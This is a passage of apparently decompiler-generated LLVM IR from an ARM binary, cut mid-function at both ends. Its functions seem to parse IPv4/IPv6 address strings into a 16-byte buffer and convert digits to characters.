  %v0_13f0c = load i32, i32* %r1.global-to-local, align 4
  %v1_13f0c = add i32 %v0_13f0c, 1
  store i32 %v1_13f0c, i32* %r1.global-to-local, align 4
  %v8_13f10 = icmp sgt i32 %v1_13f04, 4
  br i1 %v8_13f10, label %dec_label_pc_13f70, label %dec_label_pc_13f3c.backedge

dec_label_pc_13f18:                               ; preds = %dec_label_pc_13ed4
  %v7_13f18 = icmp eq i32 %v0_13f18, 46
  store i1 %v7_13f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13f18, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_13f18
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13f70

bb:                                               ; preds = %dec_label_pc_13f18
  %v1_13f20 = load i32, i32* %r1.global-to-local, align 4
  %v2_13f20 = urem i32 %v1_13f20, 2
  %v2_13f24 = icmp eq i32 %v2_13f20, 0
  store i1 %v2_13f24, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_13f24, label %dec_label_pc_13f70, label %dec_label_pc_13f30

dec_label_pc_13f30:                               ; preds = %bb
  %v0_13f30 = load i32, i32* @lr, align 4
  %v7_13f30 = icmp eq i32 %v0_13f30, 4
  store i1 %v7_13f30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13f30, label %dec_label_pc_13f70, label %dec_label_pc_13f38

dec_label_pc_13f38:                               ; preds = %dec_label_pc_13f30
  %v2_13f38 = load i32, i32* %r0.global-to-local, align 4
  %v3_13f38 = add i32 %v2_13f38, 1
  %v4_13f38 = inttoptr i32 %v3_13f38 to i8*
  store i8 0, i8* %v4_13f38, align 1
  %v5_13f38 = load i32, i32* %r0.global-to-local, align 4
  %v6_13f38 = add i32 %v5_13f38, 1
  store i32 %v6_13f38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f3c.backedge

dec_label_pc_13f3c.backedge:                      ; preds = %dec_label_pc_13f38, %dec_label_pc_13ef8, %dec_label_pc_13f04
  %v0_13f3c = load i32, i32* @r4, align 4
  %v1_13f3c = inttoptr i32 %v0_13f3c to i8*
  %v2_13f3c = load i8, i8* %v1_13f3c, align 1
  %v3_13f3c = zext i8 %v2_13f3c to i32
  %v5_13f3c = add i32 %v0_13f3c, 1
  store i32 %v5_13f3c, i32* @r4, align 4
  %v2_13f40 = icmp eq i8 %v2_13f3c, 0
  store i1 %v2_13f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f40, label %dec_label_pc_13f3c.dec_label_pc_13f4c_crit_edge, label %dec_label_pc_13ed4

dec_label_pc_13f3c.dec_label_pc_13f4c_crit_edge:  ; preds = %dec_label_pc_13f3c.backedge
  %v0_13f4c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_13f4c

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f3c.dec_label_pc_13f4c_crit_edge, %dec_label_pc_13eac
  %v0_13f4c = phi i32 [ %v0_13f4c.pre, %dec_label_pc_13f3c.dec_label_pc_13f4c_crit_edge ], [ 0, %dec_label_pc_13eac ]
  %v7_13f4c = icmp eq i32 %v0_13f4c, 3
  store i1 %v7_13f4c, i1* %cpsr_z.global-to-local, align 1
  %v7_13f50 = icmp slt i32 %v0_13f4c, 4
  br i1 %v7_13f50, label %dec_label_pc_13f70, label %dec_label_pc_13f54

dec_label_pc_13f54:                               ; preds = %dec_label_pc_13f4c
  %v0_13f54 = load i32, i32* @r5, align 4
  store i32 %v0_13f54, i32* @r0, align 4
  store i32 %v2_13eb4, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_13f60 = call i32 @function_ef60()
  br label %dec_label_pc_13f70

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13ee0, %dec_label_pc_13f04, %bb, %dec_label_pc_13f30, %.thread12, %dec_label_pc_13f4c, %dec_label_pc_13f54
  %storemerge = phi i32 [ 1, %dec_label_pc_13f54 ], [ 0, %dec_label_pc_13f4c ], [ 0, %.thread12 ], [ 0, %dec_label_pc_13f30 ], [ 0, %bb ], [ 0, %dec_label_pc_13f04 ], [ 0, %dec_label_pc_13ee0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_13eac, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_13f4c, { 1, 0 }
  uselistorder i32 %v3_13f3c, { 1, 0 }
  uselistorder i32 %v0_13f18, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 0, 5, 6, 7, 8, 9, 10, 1 }
  uselistorder label %dec_label_pc_13f70, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_13f3c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13ed4, { 1, 0 }
}

define i32 @function_13f78(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13f78:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_13f78 = load i32, i32* @r4, align 4
  %v6_13f78 = load i32, i32* @r5, align 4
  %v9_13f78 = load i32, i32* @r6, align 4
  %v7_13f7c = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_13f7c, label %dec_label_pc_13f9c, label %dec_label_pc_13f90

dec_label_pc_13f90:                               ; preds = %dec_label_pc_13f78
  %v7_13f90 = icmp eq i32 %arg1, 10
  br i1 %v7_13f90, label %dec_label_pc_13fb0, label %dec_label_pc_14160

dec_label_pc_13f9c:                               ; preds = %dec_label_pc_13f78
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_13fa4 = call i32 @function_13eac(i8* %arg2, i32 %arg3)
  store i32 %v4_13fa4, i32* %r0.global-to-local, align 4
  store i32 %v4_13fa4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_13fb0:                               ; preds = %dec_label_pc_13f90
  %v2_13fb0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_13fb0, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_13fbc = bitcast i32* %stack_var_-52 to i8*
  %v3_13fbc = call i32 @function_ef70(i8* %v2_13fbc, i32 0)
  store i32 %v3_13fbc, i32* %r0.global-to-local, align 4
  %v0_13fc0 = load i32, i32* @r6, align 4
  %v1_13fc0 = inttoptr i32 %v0_13fc0 to i8*
  %v2_13fc0 = load i8, i8* %v1_13fc0, align 1
  %v3_13fc0 = zext i8 %v2_13fc0 to i32
  store i32 %v3_13fc0, i32* %r3.global-to-local, align 4
  %v7_13fc4 = icmp eq i8 %v2_13fc0, 58
  store i32 %v3_13fbc, i32* @r4, align 4
  %v2_13fcc = add i32 %v3_13fbc, 16
  store i32 %v2_13fcc, i32* %r8.global-to-local, align 4
  br i1 %v7_13fc4, label %dec_label_pc_13fd4, label %dec_label_pc_13fe0

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13fb0
  %v1_13fd4 = add i32 %v0_13fc0, 1
  %v2_13fd4 = inttoptr i32 %v1_13fd4 to i8*
  %v3_13fd4 = load i8, i8* %v2_13fd4, align 1
  %v4_13fd4 = zext i8 %v3_13fd4 to i32
  store i32 %v4_13fd4, i32* %r3.global-to-local, align 4
  store i32 %v1_13fd4, i32* @r6, align 4
  %v7_13fd8 = icmp eq i8 %v3_13fd4, 58
  br i1 %v7_13fd8, label %dec_label_pc_13fe0, label %dec_label_pc_14174

dec_label_pc_13fe0:                               ; preds = %dec_label_pc_13fd4, %dec_label_pc_13fb0
  %v0_13fe4 = phi i32 [ %v1_13fd4, %dec_label_pc_13fd4 ], [ %v0_13fc0, %dec_label_pc_13fb0 ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_13fe4, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_140c07 = inttoptr i32 %v0_13fe4 to i8*
  %v2_140c08 = load i8, i8* %v1_140c07, align 1
  %v3_140c09 = zext i8 %v2_140c08 to i32
  store i32 %v3_140c09, i32* %r0.global-to-local, align 4
  %v1_140c410 = call i32 @function_14c24(i32 %v3_140c09)
  store i32 %v1_140c410, i32* %r0.global-to-local, align 4
  store i32 %v1_140c410, i32* @r5, align 4
  %v2_140c812 = icmp eq i32 %v1_140c410, 0
  br i1 %v2_140c812, label %dec_label_pc_140d0, label %dec_label_pc_13ff4

dec_label_pc_13ff4:                               ; preds = %dec_label_pc_13fe0, %dec_label_pc_140c0.backedge
  %v0_13ff8 = phi i32 [ %v1_140c4, %dec_label_pc_140c0.backedge ], [ %v1_140c410, %dec_label_pc_13fe0 ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_140c0.backedge ], [ 0, %dec_label_pc_13fe0 ]
  store i32 ptrtoint ([17 x i8]* @global_var_1818c.622 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1818c.622 to i32), i32* %r0.global-to-local, align 4
  %v3_14000 = call i32 @function_14c58(i32 ptrtoint ([17 x i8]* @global_var_1818c.622 to i32), i32 %v0_13ff8)
  %v4_14000 = trunc i32 %v3_14000 to i8
  store i32 %v3_14000, i32* %r0.global-to-local, align 4
  %v3_14004 = icmp eq i8 %v4_14000, 0
  %v0_14008 = load i32, i32* @r6, align 4
  %v1_14008 = add i32 %v0_14008, 1
  store i32 %v1_14008, i32* @r6, align 4
  br i1 %v3_14004, label %dec_label_pc_14024, label %dec_label_pc_14010

dec_label_pc_14010:                               ; preds = %dec_label_pc_13ff4
  %v0_14010 = load i32, i32* %sb.global-to-local, align 4
  %v2_14010 = sext i8 %v4_14000 to i32
  %v3_14010 = sub i32 %v2_14010, %v0_14010
  store i32 %v3_14010, i32* %r3.global-to-local, align 4
  %v1_14014 = load i32, i32* %r7.global-to-local, align 4
  %v4_14014 = mul i32 %v1_14014, 16
  %v5_14014 = or i32 %v4_14014, %v3_14010
  store i32 %v5_14014, i32* %r7.global-to-local, align 4
  %v3_1401c = icmp ult i32 %v5_14014, 65534
  br i1 %v3_1401c, label %dec_label_pc_140b8, label %dec_label_pc_14174

dec_label_pc_14024:                               ; preds = %dec_label_pc_13ff4
  %v0_14024 = load i32, i32* @r5, align 4
  %v7_14024 = icmp eq i32 %v0_14024, 58
  br i1 %v7_14024, label %dec_label_pc_1402c, label %dec_label_pc_14088

dec_label_pc_1402c:                               ; preds = %dec_label_pc_14024
  %v4_1402c2 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_1402c2, i32* %r3.global-to-local, align 4
  %v2_14030 = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_14030, label %dec_label_pc_14038, label %dec_label_pc_1404c

dec_label_pc_14038:                               ; preds = %dec_label_pc_1402c
  %v0_14038 = load i32, i32* %fp.global-to-local, align 4
  %v2_14038 = icmp eq i32 %v0_14038, 0
  br i1 %v2_14038, label %dec_label_pc_14040, label %dec_label_pc_14174

dec_label_pc_14040:                               ; preds = %dec_label_pc_14038
  %v0_14040 = load i32, i32* @r4, align 4
  store i32 %v0_14040, i32* %fp.global-to-local, align 4
  store i32 %v1_14008, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_140c0.backedge

dec_label_pc_1404c:                               ; preds = %dec_label_pc_1402c
  %v1_1404c = inttoptr i32 %v1_14008 to i8*
  %v2_1404c = load i8, i8* %v1_1404c, align 1
  %v3_1404c = zext i8 %v2_1404c to i32
  store i32 %v3_1404c, i32* %r3.global-to-local, align 4
  %v2_14050 = icmp eq i8 %v2_1404c, 0
  br i1 %v2_14050, label %dec_label_pc_14174, label %dec_label_pc_14058

dec_label_pc_14058:                               ; preds = %dec_label_pc_1404c
  %v0_14058 = load i32, i32* @r4, align 4
  %v1_14058 = add i32 %v0_14058, 2
  store i32 %v1_14058, i32* %r3.global-to-local, align 4
  %v1_1405c = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_14058, %v1_1405c
  br i1 %tmp38, label %dec_label_pc_14174, label %dec_label_pc_14064

dec_label_pc_14064:                               ; preds = %dec_label_pc_14058
  %v0_14064 = load i32, i32* %r7.global-to-local, align 4
  %v3_14064 = udiv i32 %v0_14064, 256
  store i32 %v3_14064, i32* %r2.global-to-local, align 4
  store i32 %v0_14058, i32* %r3.global-to-local, align 4
  %v1_1406c = trunc i32 %v3_14064 to i8
  %v3_1406c = inttoptr i32 %v0_14058 to i8*
  store i8 %v1_1406c, i8* %v3_1406c, align 1
  %v4_1406c = load i32, i32* %r3.global-to-local, align 4
  %v5_1406c = add i32 %v4_1406c, 1
  store i32 %v5_1406c, i32* %r3.global-to-local, align 4
  %v0_14070 = load i32, i32* @r6, align 4
  store i32 %v0_14070, i32* %sl.global-to-local, align 4
  %v0_14074 = load i32, i32* %r7.global-to-local, align 4
  %v1_14074 = trunc i32 %v0_14074 to i8
  %v2_14074 = load i32, i32* @r4, align 4
  %v3_14074 = add i32 %v2_14074, 1
  %v4_14074 = inttoptr i32 %v3_14074 to i8*
  store i8 %v1_14074, i8* %v4_14074, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1407c = load i32, i32* %r3.global-to-local, align 4
  %v1_1407c = add i32 %v0_1407c, 1
  store i32 %v1_1407c, i32* @r4, align 4
  %v0_140c0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_140c0.backedge

dec_label_pc_14088:                               ; preds = %dec_label_pc_14024
  %v7_14088 = icmp eq i32 %v0_14024, 46
  br i1 %v7_14088, label %dec_label_pc_14090, label %dec_label_pc_14174

dec_label_pc_14090:                               ; preds = %dec_label_pc_14088
  %v0_14090 = load i32, i32* @r4, align 4
  %v1_14090 = add i32 %v0_14090, 4
  store i32 %v1_14090, i32* @r5, align 4
  %v1_14094 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_14090, %v1_14094
  br i1 %tmp39, label %dec_label_pc_14174, label %dec_label_pc_1409c

dec_label_pc_1409c:                               ; preds = %dec_label_pc_14090
  %v0_140a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_140a0 = inttoptr i32 %v0_140a0 to i8*
  store i32 %v0_140a0, i32* %r0.global-to-local, align 4
  %v4_140a4 = call i32 @function_13eac(i8* %v1_140a0, i32 %v0_14090)
  store i32 %v4_140a4, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_140a4, 1
  br i1 %tmp36, label %dec_label_pc_14174, label %bb

bb:                                               ; preds = %dec_label_pc_1409c
  %v5_140ac = load i32, i32* @r5, align 4
  store i32 %v5_140ac, i32* @r4, align 4
  br label %dec_label_pc_140fc

dec_label_pc_140b8:                               ; preds = %dec_label_pc_14010
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_140c0.backedge

dec_label_pc_140c0.backedge:                      ; preds = %dec_label_pc_140b8, %dec_label_pc_14040, %dec_label_pc_14064
  %v0_140c0 = phi i32 [ %v1_14008, %dec_label_pc_14040 ], [ %v0_140c0.pre, %dec_label_pc_14064 ], [ %v1_14008, %dec_label_pc_140b8 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_14040 ], [ 0, %dec_label_pc_14064 ], [ 1, %dec_label_pc_140b8 ]
  %v1_140c0 = inttoptr i32 %v0_140c0 to i8*
  %v2_140c0 = load i8, i8* %v1_140c0, align 1
  %v3_140c0 = zext i8 %v2_140c0 to i32
  store i32 %v3_140c0, i32* %r0.global-to-local, align 4
  %v1_140c4 = call i32 @function_14c24(i32 %v3_140c0)
  store i32 %v1_140c4, i32* %r0.global-to-local, align 4
  store i32 %v1_140c4, i32* @r5, align 4
  %v2_140c8 = icmp eq i32 %v1_140c4, 0
  br i1 %v2_140c8, label %dec_label_pc_140d0, label %dec_label_pc_13ff4

dec_label_pc_140d0:                               ; preds = %dec_label_pc_140c0.backedge, %dec_label_pc_13fe0
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_13fe0 ], [ %stack_var_-56.0.be, %dec_label_pc_140c0.backedge ]
  %v4_140d03 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_140d03, i32* %r3.global-to-local, align 4
  %v2_140d4 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_14140.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_140d4, label %dec_label_pc_140fc, label %dec_label_pc_140dc

dec_label_pc_140dc:                               ; preds = %dec_label_pc_140d0
  %v1_140dc = add i32 %v0_14140.pre.pre, 2
  store i32 %v1_140dc, i32* %r3.global-to-local, align 4
  %v1_140e0 = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_140dc, %v1_140e0
  br i1 %tmp40, label %dec_label_pc_14174, label %dec_label_pc_140e8

dec_label_pc_140e8:                               ; preds = %dec_label_pc_140dc
  store i32 %v0_14140.pre.pre, i32* %r3.global-to-local, align 4
  %v0_140ec = load i32, i32* %r7.global-to-local, align 4
  %v3_140ec = udiv i32 %v0_140ec, 256
  store i32 %v3_140ec, i32* %r2.global-to-local, align 4
  %v1_140f0 = trunc i32 %v3_140ec to i8
  %v3_140f0 = inttoptr i32 %v0_14140.pre.pre to i8*
  store i8 %v1_140f0, i8* %v3_140f0, align 1
  %v4_140f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_140f0 = add i32 %v4_140f0, 1
  store i32 %v5_140f0, i32* %r3.global-to-local, align 4
  %v0_140f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_140f4 = trunc i32 %v0_140f4 to i8
  %v2_140f4 = load i32, i32* @r4, align 4
  %v3_140f4 = add i32 %v2_140f4, 1
  %v4_140f4 = inttoptr i32 %v3_140f4 to i8*
  store i8 %v1_140f4, i8* %v4_140f4, align 1
  %v0_140f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_140f8 = add i32 %v0_140f8, 1
  store i32 %v1_140f8, i32* @r4, align 4
  br label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140d0, %bb, %dec_label_pc_140e8
  %v0_14140.pre = phi i32 [ %v5_140ac, %bb ], [ %v1_140f8, %dec_label_pc_140e8 ], [ %v0_14140.pre.pre, %dec_label_pc_140d0 ]
  %v0_140fc = load i32, i32* %fp.global-to-local, align 4
  %v2_140fc = icmp eq i32 %v0_140fc, 0
  %v1_14140.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_140fc, label %dec_label_pc_14140, label %dec_label_pc_14104

dec_label_pc_14104:                               ; preds = %dec_label_pc_140fc
  %v9_14104 = icmp eq i32 %v0_14140.pre, %v1_14140.pre
  %v2_14108 = sub i32 %v0_14140.pre, %v0_140fc
  store i32 %v2_14108, i32* %r0.global-to-local, align 4
  br i1 %v9_14104, label %dec_label_pc_14174, label %dec_label_pc_14128.preheader

dec_label_pc_14128.preheader:                     ; preds = %dec_label_pc_14104
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14128

dec_label_pc_14118:                               ; preds = %dec_label_pc_14128
  %v0_14118 = load i32, i32* %fp.global-to-local, align 4
  %v2_14118 = add i32 %v0_14118, %v2_1412c
  %v3_14118 = inttoptr i32 %v2_14118 to i8*
  %v4_14118 = load i8, i8* %v3_14118, align 1
  %v3_1411c = inttoptr i32 %v2_14130 to i8*
  store i8 %v4_14118, i8* %v3_1411c, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_14124 = load i32, i32* %fp.global-to-local, align 4
  %v3_14124 = load i32, i32* %ip.global-to-local, align 4
  %v4_14124 = add i32 %v3_14124, %v2_14124
  %v5_14124 = inttoptr i32 %v4_14124 to i8*
  store i8 0, i8* %v5_14124, align 1
  %v0_14128.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14128.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14130.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14128

dec_label_pc_14128:                               ; preds = %dec_label_pc_14128.preheader, %dec_label_pc_14118
  %v0_1413c = phi i32 [ %v1_14140.pre, %dec_label_pc_14128.preheader ], [ %v1_14130.pre, %dec_label_pc_14118 ]
  %v1_1412c = phi i32 [ %v2_14108, %dec_label_pc_14128.preheader ], [ %v1_14128.pre, %dec_label_pc_14118 ]
  %v0_14134 = phi i32 [ 1, %dec_label_pc_14128.preheader ], [ %v0_14128.pre, %dec_label_pc_14118 ]
  %v2_1412c = sub i32 %v1_1412c, %v0_14134
  store i32 %v2_1412c, i32* %ip.global-to-local, align 4
  %v2_14130 = sub i32 %v0_1413c, %v0_14134
  store i32 %v2_14130, i32* @lr, align 4
  %v1_14134 = add i32 %v0_14134, 1
  store i32 %v1_14134, i32* %r2.global-to-local, align 4
  %v7_14138 = icmp slt i32 %v1_1412c, %v0_14134
  br i1 %v7_14138, label %dec_label_pc_1413c, label %dec_label_pc_14118

dec_label_pc_1413c:                               ; preds = %dec_label_pc_14128
  store i32 %v0_1413c, i32* @r4, align 4
  br label %dec_label_pc_14140

dec_label_pc_14140:                               ; preds = %dec_label_pc_140fc, %dec_label_pc_1413c
  %v0_14140 = phi i32 [ %v0_1413c, %dec_label_pc_1413c ], [ %v0_14140.pre, %dec_label_pc_140fc ]
  %v1_14140 = phi i32 [ %v0_1413c, %dec_label_pc_1413c ], [ %v1_14140.pre, %dec_label_pc_140fc ]
  %v9_14140 = icmp eq i32 %v0_14140, %v1_14140
  br i1 %v9_14140, label %dec_label_pc_14148, label %dec_label_pc_14174

dec_label_pc_14148:                               ; preds = %dec_label_pc_14140
  store i32 16, i32* @r2, align 4
  %v2_1414c = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_1414c, i32* @r0, align 4
  store i32 %v2_13fb0, i32* @r1, align 4
  %v0_14154 = call i32 @function_ef60()
  store i32 %v0_14154, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14160:                               ; preds = %dec_label_pc_13f90
  %v0_14160 = call i32 @function_cec4()
  store i32 %v0_14160, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1416c = inttoptr i32 %v0_14160 to i32*
  store i32 97, i32* %v2_1416c, align 4
  %v0_14178.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14174:                               ; preds = %dec_label_pc_14010, %dec_label_pc_14038, %dec_label_pc_14058, %dec_label_pc_1404c, %dec_label_pc_1409c, %dec_label_pc_14104, %dec_label_pc_14088, %dec_label_pc_14140, %dec_label_pc_13fd4, %dec_label_pc_140dc, %dec_label_pc_14090
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_14160, %dec_label_pc_14148, %dec_label_pc_13f9c, %dec_label_pc_14174
  %v0_14178 = phi i32 [ %v0_14178.pre, %dec_label_pc_14160 ], [ 1, %dec_label_pc_14148 ], [ %v4_13fa4, %dec_label_pc_13f9c ], [ 0, %dec_label_pc_14174 ]
  store i32 %v0_14178, i32* %r0.global-to-local, align 4
  store i32 %v3_13f78, i32* @r4, align 4
  store i32 %v6_13f78, i32* @r5, align 4
  store i32 %v9_13f78, i32* @r6, align 4
  ret i32 %v0_14178

; uselistorder directives
  uselistorder i32 %v0_14178, { 1, 0 }
  uselistorder i32 %v2_14130, { 1, 0 }
  uselistorder i32 %v2_1412c, { 1, 0 }
  uselistorder i32 %v0_14134, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1413c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14140.pre, { 0, 2, 1 }
  uselistorder i32 %v0_14140.pre, { 2, 0, 1 }
  uselistorder i32 %v3_140ec, { 1, 0 }
  uselistorder i32 %v0_14140.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_140c4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_140a0, { 1, 0 }
  uselistorder i32 %v3_14064, { 1, 0 }
  uselistorder i32 %v0_14058, { 1, 0, 2 }
  uselistorder i32 %v1_14008, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_14000, { 1, 0 }
  uselistorder i32 %v0_13fe4, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 2, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 9, 13, 7, 6, 8, 12, 11, 10, 15, 14, 17, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_14c24, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14178, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14174, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_14140, { 1, 0 }
  uselistorder label %dec_label_pc_14128, { 1, 0 }
  uselistorder label %dec_label_pc_140fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140c0.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13ff4, { 1, 0 }
}

define i32 @function_14188(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14188:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14188 = load i32, i32* @r4, align 4
  store i32 %v3_14188, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_18178.624 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_141a4 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_141a4, i32* @r0, align 4
  %v0_141a8 = call i32 @function_ef60()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_141b8 = bitcast i32* %stack_var_-51 to i8*
  %v3_141b8 = call i32 @function_ef70(i8* %v2_141b8, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_14280 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1425c = add i32 %v2_14280, -17
  br label %dec_label_pc_14280

dec_label_pc_141c8:                               ; preds = %dec_label_pc_14280
  %v0_141c8 = load i32, i32* %fp.global-to-local, align 4
  %v2_141c8 = add i32 %v0_141c8, %v1_141c8
  %v3_141c8 = inttoptr i32 %v2_141c8 to i8*
  %v4_141c8 = load i8, i8* %v3_141c8, align 1
  %v6_141c8 = zext i8 %v4_141c8 to i32
  store i32 %v6_141c8, i32* %r4.global-to-local, align 4
  %v1_141cc = add i32 %v0_141cc, 1
  store i32 %v1_141cc, i32* %r7.global-to-local, align 4
  store i32 %v2_14280, i32* %r2.global-to-local, align 4
  store i32 %v6_141c8, i32* @r0, align 4
  %v2_141d8 = add i32 %v1_141cc, %v2_14280
  store i32 %v2_141d8, i32* %sl.global-to-local, align 4
  %v0_141dc = call i32 @function_14f20()
  %v1_141e0 = add i32 %v0_141dc, 48
  %v1_141e4 = trunc i32 %v1_141e0 to i8
  %v2_141e4 = load i32, i32* %r5.global-to-local, align 4
  %v3_141e4 = add i32 %v2_141e4, -17
  %v4_141e4 = inttoptr i32 %v3_141e4 to i8*
  store i8 %v1_141e4, i8* %v4_141e4, align 1
  %v0_141e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_141e8 = add i32 %v0_141e8, -17
  %v2_141e8 = inttoptr i32 %v1_141e8 to i8*
  %v3_141e8 = load i8, i8* %v2_141e8, align 1
  %v7_141ec = icmp eq i8 %v3_141e8, 48
  %v0_141f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_141f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_141f0 = add i32 %v1_141f0, %v0_141f0
